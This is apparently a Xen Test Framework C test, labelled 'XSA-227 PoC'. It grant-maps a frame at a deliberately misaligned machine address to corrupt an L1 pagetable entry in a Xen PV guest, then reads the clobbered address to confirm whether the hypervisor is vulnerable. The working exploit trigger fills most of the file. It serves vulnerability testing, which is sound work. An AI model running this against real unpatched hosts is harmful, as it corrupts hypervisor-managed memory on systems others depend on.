/**
 * @file tests/xsa-227/main.c
 * @ref test-xsa-227
 *
 * @page test-xsa-227 XSA-227
 *
 * Advisory: [XSA-227](https://xenbits.xen.org/xsa/advisory-227.html)
 *
 * For x86 PV guests, the #GNTTABOP_map_grant_ref hypercall allows mapping by
 * nominated linear address, or by nominating a specific L1e.  However, there
 * are no alignment checks when nominating a specific L1e, and Xen would write
 * the PTE at the guests chosen alignment, corrupting the L1 pagetable.
 *
 * In this test, a frame is grant mapped in a way which tries to splice across
 * the L1e mapping the linear addresses at 4K and 8K.  If vulnerable, the
 * lower flags of the grant PTE end up overwriting the high user-defined bits
 * of the L1e mapping 4K, with User/Writeable/Present causing reserved bits to
 * be set.
 *
 * @see tests/xsa-227/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-227 PoC";

static uint8_t frame[PAGE_SIZE] __page_aligned_bss;

void test_main(void)
{
    int rc = xtf_init_grant_table(1);

    if ( rc )
        return xtf_error("Error initialising grant table: %d\n", rc);

    int domid = xtf_get_domid();

    if ( domid < 0 )
        return xtf_error("Error getting domid\n");

    /*
     * Construct gref 8 to allow frame[] to be mapped by ourselves.
     */
    gnttab_v1[8].domid = domid;
    gnttab_v1[8].frame = virt_to_gfn(frame);
    smp_wmb();
    gnttab_v1[8].flags = GTF_permit_access;

    /* Opencoded pagewalk to KB(4) */
    intpte_t *l4t = _p(pv_start_info->pt_base);
    intpte_t *l3t = maddr_to_virt(pte_to_paddr(l4t[0]));
    intpte_t *l2t = maddr_to_virt(pte_to_paddr(l3t[0]));
    intpte_t *l1t = maddr_to_virt(pte_to_paddr(l2t[0]));

    /*
     * Unmap the linear address we are going to mostly clobber.  Reduces the
     * chance of Xen falling over a refcounting problem.
     */
    if ( hypercall_update_va_mapping(KB(8), 0, UVMF_INVLPG) )
        return xtf_error("Failed to unmap KB(8)\n");

    struct gnttab_map_grant_ref map = {
        .host_addr = virt_to_maddr(&l1t[2]) - 2,
        .flags = GNTMAP_contains_pte | GNTMAP_host_map,
        .ref = 8,
        .dom = domid,
    };

    /*
     * Try to map frame[] to ourselves with a PTE-misaligned machine address.
     */
    rc = hypercall_grant_table_op(GNTTABOP_map_grant_ref, &map, 1);

    if ( !rc && !map.status )
        /* Map call succeeded. */
        xtf_failure("Fail: Vulnerable to XSA-227\n");
    else
        /* Map call failed. */
        printk("Probably not vulnerable to XSA-227\n");

    printk("Attempting to confirm...\n");

    exinfo_t fault = 0;
    unsigned int discard;

    /*
     * Try to use the linear address which was clobbered by the map call.
     */
    asm volatile ("1: mov %[ptr], %[res]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+a" (fault),
                    [res] "=q" (discard)
                  : [ptr] "m" (*(char *)KB(4)),
                    [rec] "p" (ex_record_fault_eax));

    switch ( fault )
    {
    case 0:
        /* No fault => the PTE wasn't clobbered. */
        xtf_success("Success: Not vulnerable to XSA-227\n");
        break;

    case EXINFO_SYM(PF, PFEC_SYM(R, P)):
        /* #PF[Rsvd] => the PTE was clobbered. */
        xtf_failure("Failure: Got Rsvd #PF\n");
        break;

    default:
        xtf_error("Unexpected fault %#x, %pe\n", fault, _p(fault));
        break;
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
